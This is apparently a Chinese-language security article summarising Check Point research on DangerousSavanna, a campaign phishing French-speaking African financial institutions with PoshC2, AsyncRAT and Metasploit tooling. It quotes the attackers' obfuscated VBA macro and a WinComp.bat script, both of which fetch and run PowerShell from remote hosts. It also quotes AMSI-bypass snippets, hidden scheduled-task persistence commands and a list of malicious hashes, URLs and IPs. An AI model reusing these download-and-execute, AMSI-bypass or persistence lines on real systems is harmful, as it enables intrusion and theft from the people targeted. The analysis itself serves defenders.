最近，研究人员发现中非和西非超过 85% 的金融机构多次遭受破坏性网络攻击。其中四分之一的入侵攻击，导致了信息泄露、身份盗窃、汇款欺诈等情况发生。

经过分析，发起攻击的 DangerousSavanna
在过去两年中一直针对非洲法语区主要金融机构进行入侵。攻击者向至少五个不同法语国家（科特迪瓦、摩洛哥、喀麦隆、塞内加尔和多哥）的金融机构员工发送带有恶意附件的电子邮件，研究人员认为
DangerousSavanna 是受利益驱动的黑产组织。

![image.png-102.8kB](https://image.3001.net/images/20220910/1662825331_631cb373558edf3ef521a.png!small)非洲法语国家遭受攻击

DangerousSavanna 使用的攻击工具都是基于 Metasploit、PoshC2、DWservice 和 AsyncRAT
等开源项目再次定制开发的。攻击者不断改变利用各种恶意文件类型的感染链，通过各种复杂和多样的媒介进行攻击。

## 感染链

攻击从法语编写的鱼叉邮件开始，通过 Gmail 和 Hotmail
等公开服务发送给员工。后续攻击者开始使用相似的域名仿冒非洲其他金融机构，如突尼斯外国银行、Nedbank 等。

![image.png-153.6kB](https://image.3001.net/images/20220910/1662825332_631cb37420e9642cc49e2.png!small)钓鱼邮件

感染链也在不断变化，最开始使用伪装成 PDF
文件的可执行文件，后续扩展为使用各种文件类型。在微软默认禁止宏代码执行后，攻击者迅速转向了其他文件类型用于攻击。

![image.png-267.6kB](https://image.3001.net/images/20220910/1662825333_631cb3752a297ec2871ef.png!small)感染链演化

## 恶意样本

2021 年以来，攻击者使用的恶意文档要么是带有宏的 Word 文档，要么是带有远程模板的文档，又或者是诱使受害者下载并执行的 PDF
文档。所有的文档都是法文的内容，并且元数据相似，例如用户名为 digger、hooper、davis 和 HooperDEV。

![image.png-369.3kB](https://image.3001.net/images/20220910/1662825334_631cb376d960ec3c173d9.png!small)诱饵文档概览

常见的感染流程是使用带有宏的 Word 文档，在 Startup 文件夹中释放一个 LNK 文件。执行 LNK 文件后，会从服务器下载并执行
PowerShell 命令，这些命令会绕过 AMSI 并最终安装 PoshC2。

![image.png-69.8kB](https://image.3001.net/images/20220910/1662825336_631cb378675080c8fab78.png!small)感染流程

宏代码中掺杂了许多未使用的代码，对抗检测与分析。功能本身实际上非常简单，就是下载执行：

    
    
    Private Function guttural(ludicrous As String)guttural = StrReverse(ludicrous)End FunctionSub automatic()Set tearful = grandiose(guttural("llehS.tpircSW"))Dim greasycowardly = tearful.SpecialFolders(guttural("putratS")) & guttural("knl.ogol/")Set great = tearful.CreateShortcut(cowardly)great.IconLocation = guttural("oci.serutcip\}9c2278fc2f8d-dda8-9bf4-e6cf-658bed70{\ksaT\egatS eciveD\tfosorciM\ataDmargorP\:C")great.WindowStyle = 7great.TargetPath = guttural("ex" & "e.dmc")great.Arguments = guttural(")^)'""d""d/t^t/m""o""c.ez""i""ig.s""s""erp//:p""t""th'(gn""i""rtSdao^lnw""o""d.)tnei^lcb""e""w.t^en tcej^bo-""w""en((x""e""i c^- i^n^on- ss^a^py^B c^e^xE- ne^ddi^h dn^i^w- po^n- e^xe.l^lehs^re^w^op c/, ex^e.d^mc")great.WorkingDirectory = "C:"great.HotKey = Chr(69 - 4)great.Description = "OpenDrive"great.SaveEnd Sub﻿

攻击者会使用 PDF 文件引诱受害者下载并执行，后续执行相似功能的 VBE 或 JAR 文件，直接加载 PoshC2 或者释放 LNK 文件加载
PoshC2。

## PoshC2

攻击者依靠 PoshC2 实现对失陷主机的控制，执行的 PowerShell 代码中包含两种非常相似的 AMSI 绕过技术：

    
    
    $a = [Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iutils")     { $c = $b }};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*itFailed")    { $f = $e }};$f.SetValue($null,$true)[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)﻿

负责与 C&C 服务器进行通信的后门会在一个循环中向服务器发送请求，其中包含表明受害者信息的 SessionID。SessionID 格式为
`$env:userdomain;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;$procname;1`，传送时会使用
base64 编码与 AES 进行加密。

## AsyncRAT

2021 年 10 月的攻击行动中，恶意文档访问了 paste.c-net.org 却下载了一个在内存中加载 AsyncRAT 的 PowerShell
脚本。AsyncRAT 完全没有经过任何混淆，甚至还保留着原生的服务器证书（`AsyncRAT Server`），攻击者完全没有对开源工具进行任何修改。

![image.png-239.5kB](https://image.3001.net/images/20220910/1662825337_631cb3790eee88b70a3f5.png!small)代码对比

## 旧版本文档

最早的恶意文档是在 2021 年上半年发现的，宏代码明显经过高度混淆，而且还具有超过 1MB 的垃圾代码。

![image.png-123.2kB](https://image.3001.net/images/20220910/1662825337_631cb379bb3f9e89bf663.png!small)旧版本文档可视化

其中一个名为 Nouvelles_Dispositions_Sanitaires.doc 的文档使用宏代码从 4sync.com 云存储中下载
PowerShell 脚本。[InQuest](https://inquest.net/blog/2021/05/26/pschain)在 2021 年 5
月介绍了一个非常相似的恶意文档，使用 4sync 安装了一个名为 Billang 的自定义后门。

攻击者加载的 .NET 可执行文件具有
`C:\Users\wallstreet\source\repos\Billang\Billang\obj\Release\Billang.pdb`的
PDB 路径。该文件会收集失陷主机相关信息并回传。值得一提的是，Shellcode 仅在检测到鼠标点击后才会启动，这可能是作为反沙盒技术的一部分。

![image.png-647.2kB](https://image.3001.net/images/20220910/1662825339_631cb37b1087d70ad3bbb.png!small)进程注入

分析人员扩展发现了攻击者使用的更多样本，大体上类似，区别只在于混淆方法：有些使用 SmartAssembly 加壳、有些只是对变量名进行了混淆。所有使用的
Shellcode 都是 Meterpreter，这些样本中包含调试信息的都提供了 PDB 路径为 `C:\Users\wallstreet\`。

## Dropper

最早期的攻击行动中，攻击者不依靠文档而是自己编写的 Dropper。这些 Dropper 通常以 PDF 图标伪装成文档，有时也带有双重扩展名欺骗。

![image.png-135.9kB](https://image.3001.net/images/20220910/1662825340_631cb37cee6dc2d3dd66f.png!small)简化感染链

2021 年末，一些攻击行动中开始使用 C# 可执行文件来达成目标，启动 PowerShell 从服务器拉取下一个阶段的 Payload。此时，攻击者已经将
Metasploit 切换为 PoshC2，其 PDB 路径 `C:\Users\wallstreet\source\repos\PDF
Document\PDF Document\obj\Release\PDF Document.pdb`显示其开发用户都是 `wallstreet`。

## 入侵后活动

当 PowerShell 后门连接到 C&C 服务器时，攻击者自动下发 AMSI 绕过命令与
PoshC2。接下来，攻击者尝试持久化并进行侦察，同时还运行一些命令来尝试逃避检测。

### 逃避检测

为了逃避检测，攻击者会首先运行两个额外的 AMSI 绕过命令。紧接着使用 PoshC2 Inject-Shellcode 模块将 Shellcode 注入
Windows 内置二进制文件 RuntimeBroker.exe 与 iexpress.exe 中。注入的代码为 [Sharpv4
Shellcode](https://github.com/nettitude/PoshC2_Shellcode)，其中包含一个带有 Patch
AmsiScanBuffer 和 EtwEventWrite 功能的 DLL 文件：

![image.png-229.7kB](https://image.3001.net/images/20220910/1662825341_631cb37dae10a02be14fa.png!small)ShellCode
代码

![image.png-122kB](https://image.3001.net/images/20220910/1662825342_631cb37eb381b3083de64.png!small)Shellcode
注入 RuntimeBroker.exe 的事件日志

随后，样本会加载 base64 编码的 PoshC2 PowerShell 植入的 base64 编码的 .NET
可执行文件，最终以更隐蔽的方式重新建立后门，作为已知的 Microsoft 进程潜伏运行。

### 持久化

为了实现持久化，攻击者使用了批处理脚本 WinComp.bat，如下所示。

    
    
    @echo offSETLOCAL EnableExtensionsset EXE=iexpress.exeFOR /F %%x IN ('tasklist /NH /FI "IMAGENAME eq %EXE%"') DO IF %%x == %EXE% goto ProcessFoundgoto ProcessNotFound:ProcessFoundExitgoto END:ProcessNotFoundcmd cm^d.e^xe ,/c po^w^er^shel^l.ex^e -n^op -w^i^nd h^idd^en -Ex^e^c B^yp^a^ss -no^n^i -^c i"e"x((ne"w"-ob^ject ne^t.w"e"bcl^ient).d"o"wnl^oadStr"i"ng('ht""t""p://ned""b""ankplc.""4""nmn.c^om/t^t/l""l""')^)goto END:END

另外，攻击者还使用另一个脚本文件 slmgr.vbs 来执行 WinComp.bat。攻击者还创建名为 slmgr.vbs
的计划任务（五分钟运行一次）与名为 WinComp.bat 的计划任务（六分钟运行一次）。最后，攻击者会将脚本文件加以隐藏。

    
    
    schtasks /create /f /sc once /st 00:00 /du 9999:59 /ri 5 /tn WinSys /tr "C:\Users\Public\slmgr.vbs"schtasks /create /f /sc once /st 00:00 /du 9999:59 /ri 360 /tn WinSys /tr "C:\Users\Public\WinComp.bat"schtasks /create /f /sc once /st 00:00 /du 9999:59 /ri 360 /tn WinComp /tr "C:\Users\Public\WinComp.bat"attrib +h WinComp.batattrib +h slmgr.vbs

### 侦察

攻击者通过多个命令来收集环境的相关信息。例如通过 Get-Screenshot 获取屏幕截图、通过 Get-Ipconfig 获取网络信息、通过 Get-ComputerInfo 获取硬件信息、通过 Invoke-Arpscan 获取 ARP 信息。

攻击者还会尝试 Dump 进程 svchost.exe，从中提取 RDP 凭据。

### 其他工具

攻击者在站稳脚跟后，会使用名为 DWService 的合法远程访问工具。这不仅为攻击者提供了更高的自由度，还降低了被发现的概率。

攻击者还会在失陷主机上安装 Windows Subsystem for Linux (WSL)，并在其中安装名为
[CrackMapExe](https://github.com/Porchetta-Industries/CrackMapExec)的开源渗透测试工具进行
SMB 扫描。

攻击者还使用了名为 [BackstabTITAN.exe](https://github.com/Yaxser/Backstab)的开源反 EDR
工具，根据编译留下的 PDB 路径（C:\Users\wallstreet\Downloads\Programs\Backstab-master\x64\Debug\Backstab.pdb）可以发现其他样本。与前述样本一样，这些样本的 PDB 路径都指向名为 wallstreet
的开发者。

## 受害者

DangerousSavanna
针对多个在非洲开展业务的中型或大型金融机构展开攻击。这些金融机构旗下不仅包括银行，还有保险公司、小额信贷公司、金融控股公司、财务管理公司、财务咨询服务公司等。尽管攻击的水平不高，但攻击者会不断尝试、一次又一次地对同一家公司展开攻击。

## 攻击基础设施

![image.png-268.2kB](https://image.3001.net/images/20220910/1662825343_631cb37faf7a05b21e1e5.png!small)攻击基础设施变化概览

上图显示了攻击基础设施的演化情况。早期，攻击者依赖第三方文件共享服务，例如 FileSend.jp 或 4sync.com。2021
年年中，大量攻击只与类似 Pastebin 的服务 paste.c-net.org 相关。2021 年 10 月，paste.c-net.org
的运营团队对服务上的恶意内容进行了一次大清理。随后，攻击者启用了多种类型的中间服务器，包括使用 bit.ly 和 iplogger.org
重定向本地金融相关机构的相似域名（nedbank.za[.]com 伪装成 NED 银行、paste.inexa-group[.]com
伪装成金融科技解决方案提供商 Inexa），或者依赖 Dynu 等短期免费 DDNS 服务。

## 结论

本文分析了针对西非和北非金融机构的恶意攻击活动。攻击者对开源工具和渗透测试工具非常了解，经常改变攻击工具和方法。攻击并没有放缓的迹象，仍然在尝试获取更多利益。

## IOC

> 020ea21556b56229bb9714e721d893df  
> 0789e52f16f5fc4ac2dbebadf53d44ec  
> 0b1d7c043be8c696d53d63fc0c834195  
> 16157cdfd7b0ea98c44df15fb2fcb417  
> 1818f84f7f51be74a408f5e193ba5908  
> 18889d70d5546b861c6fa4ec11126942  
> 192b70891de0d54af6fa46bd35a5fd87  
> 1ccd2ce1e827b598207cc65e16686b7b  
> 1eb29f64f19e07d42d9ad8f6597424b8  
> 1eed3153b1afae1676ebd0db99ac5802  
> 1f4f537e550e4299a945a97c1f8a0441  
> 28165bb98959e7e7d9be67f0d248b31d  
> 2c95e83759487d78070b56e40843c543  
> 2e7c90c45b3cd8db15cd22e0caacfd40  
> 31515f871cb12d538d53e730e5ddd406  
> 3227c8a45ce4ccf8c475a51b331720c1  
> 3c70bc09d1f8033e57323879d50ca3ce  
> 40ec0d84272f1f2394b4a3b74dafbf70  
> 46058baa3ef1bdf553d89439cacf0675  
> 46a0071b7e5ea442580a2f80d2fcef42  
> 47c68680c9a00b117764114668357e23  
> 47cf9fda04b2abef75f1eca9804aaebe  
> 496f2a2f14bda410b5f3dcff40bf56c3  
> 4f52ca22d2d28e1ecdb9fba92e4cdde3  
> 4fb7503dd8b21396bf9643e0dce70fcf  
> 4ffd8ae803d7498e2d5a7a7a3a1268f8  
> 5038e5cd4888adb3661d9958f04a1ec1  
> 505724eac0faf0eb32e4ad25ab5cddfe  
> 518a533d6ff1d86afc0f7d94c0a1be7c  
> 565a87ba8e79f5e081ea937068082afd  
> 57511cb12fb5f505b3330dfec18f3432  
> 65cbaec27b51d54dc0bceeef298719a8  
> 66ac99b3501846a6c18f2671dbf31873  
> 6702f0057c401cf390adc28d201118f8  
> 6b14a4d6212087fe8d88ad012dbc8598  
> 6b781c1082014a0177f42e918adb35de  
> 6c737910247e3122fe810df6a63581f7  
> 6c7846d955bb5f3842bb7c35fae1569a  
> 725489b29e7afbc045b2814dff5474a6  
> 72ca000f40335d771936d077d4cabefb  
> 75931e00c81274b1c279d23dfdb0bbad  
> 76a8391c77723b06587f648dcbde07e9  
> 775c0666a7a482ce664c72ed9195f120  
> 7a4927e1a2aad1bc8ccef956130df0c0  
> 7b8d0b4e718bc543de4a049e23672d79  
> 7b91f06584afdc4a2aa6edd9d04198b7  
> 853403bd5feea1ecf83e812759e1ccc7  
> 8690ccd36c9d63b63e8d0278f0449e3b  
> 886a8ded2ea2f35ee009088d2c24dd32  
> 889e8b93ec0c16ffac62ced220ed8e30  
> 8f4392f839152c9614699048ee4fea11  
> 953d5a3d8e00bbd2dba08579d95c61dc  
> 98bf46542e3e9daa280ef0b395a7dabd  
> 9a57a80692012878fcb463f41ce6dcfa  
> 9d50143836d41726b6564a524453b868  
> 9d9da1992f63776e135c1c1215ee1741  
> a027a4f65e0b0a83eccb56d9047347bd  
> a5fd946bc7e8b12cdfd207790216b4b1  
> a6d8cc18af5a983b4c1a7f4838780b01  
> aa3f386f10864f46a09610d0e03a26b5  
> aeee6b71690a1df75792fcd3d11b8ede  
> af8de58e3538fcb40334109bcd571939  
> b397383ba85fc726b424aac26b42f6ae  
> b651f7dcfeb3e304f7eb636000a6b935  
> b895d34958be7565888c15a51e0c73c7  
> b95ba7fb130f95ccae13c54312a69d36  
> bac7be7eebb8670ae624a0179a366148  
> be82532aa428dc5f30107ccfa08da8c6  
> c43c50baa3271b375298847bf6a7fc13  
> c4ee082a4ce704dcb3145e2cfd47ef6f  
> c7beb386813580a4c4812de3ee1aa429  
> c8ed3353ae9c8b84ea7a9e81d2828193  
> c9c001c45b2eecaee9704fb21e731ac7  
> ca09b19b6975e090fb4eda6ced1847b1  
> cced9e8b1a99b9000f4b958f13b164a5  
> d32e387d60a18fd90c4854f167b4df4b  
> d43e6ae895039108cf68a36140190b0f  
> daa6ce148e2b8e5fd694183338db6ec9  
> e166ee1de912bf17453d2da1dc06fc6d  
> e2c3a6bcb015e2e5137d4a46881d38b6  
> f0960552876da5ef74b8ece55116929e  
> f2afcfd2ecfb3ea3261855ce1a4747b7  
> f4a8605fa09e447108eb714eccad57d0  
> fae63014d33efe844a25f2606de900b6  
> iplogger[.]org/2zaEa6  
> bit[.]ly/PDF_MicrosoftOnline  
>
> cdn.filesend[.]jp/private/hTsvHkbWaUSEZ7ilocBGMTgumxqFmSrVgF-9Ht5LL6YCf4A7Eu28rIxdbo-> ND_F9/Chimers.gif  
>
> 4sync[.]com/web/directDownload/QHZsERS6/rHb0lMWD.f2e6a9154ab6cd29b337d6b555367580  
>
> 4sync[.]com/web/directDownload/rE33SDmE/iNXXJkWJ.4bf28df12d9e7d99bc902edb6d23c6e2  
> raw.githubusercontent[.]com/R3mEm/vox/main/vox.ps1  
> paste.c-net[.]org/CookiesEstrogen  
> paste.c-net[.]org/ExportDeposit  
> paste.c-net[.]org/OrientalAntonio  
> paste.c-net[.]org/ShaveDavie  
> paste.c-net[.]org/SidingFatigue  
> paste.c-net[.]org/HearingsGuided  
> paste.c-net[.]org/SelvesGangster  
> paste.c-net[.]org/StaceConcerns  
> paste.c-net[.]org/BogeyUglier  
> paste.c-net[.]org/MuggingFunny  
> paste.c-net[.]org/NelsonTasteful  
> paste.c-net[.]org/ShaveDie  
> paste.c-net[.]org/GiovanniKismet  
> paste.c-net[.]org/TreatsGlamour  
> paste.c-net[.]org/NeedlessHorton  
> paste.c-net[.]org/KillingsSucked  
> paste.c-net[.]org/PuckerStake  
> paste.c-net[.]org/AliacesLorean  
> paste.c-net[.]org/MuggingFunny  
> paste.c-net[.]org/HazelMagnets  
> paste.c-net[.]org/AliasesKorean  
> paste.inexa-group[.]com  
> press.giize[.]com  
> tf-bank[.]com  
> aeternam[.]me  
> nedbank.za[.]com  
> nedbankplc.4nmn[.]com  
> secure.graviom[.]fr  
> i-development[.]one  
> 15.236.51[.]204  
> 3.8.126[.]182  
> 35.181.50[.]113  
> 13.37.250[.]144  
> 13.38.90[.]3  
> 137.116.142[.]70  
> 170.130.172[.]46  
> 192.18.141[.]199  
> 20.70.163[.]11  
> 192.9.244[.]42  
> 20.194.195[.]96

## 参考来源

> [Check Point](https://research.checkpoint.com/2022/dangeroussavanna-two-> year-long-campaign-targets-financial-institutions-in-french-speaking-> africa/)

